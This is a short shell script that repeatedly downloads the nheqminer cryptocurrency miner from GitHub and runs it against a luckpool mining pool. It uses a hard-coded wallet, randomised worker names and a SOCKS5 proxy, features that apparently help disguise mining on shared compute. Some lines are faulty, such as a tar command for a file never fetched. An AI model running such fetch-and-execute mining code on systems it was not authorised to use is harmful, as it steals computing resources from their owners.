#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
./nheqminer -v -l na.luckpool.net:3956 -u RLzgpxPC9Kioxe4sZr6Eitxpjkt9dbgZFH.$(echo $(shuf -i 1-999 -n 1)-luck) -p x -t 2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
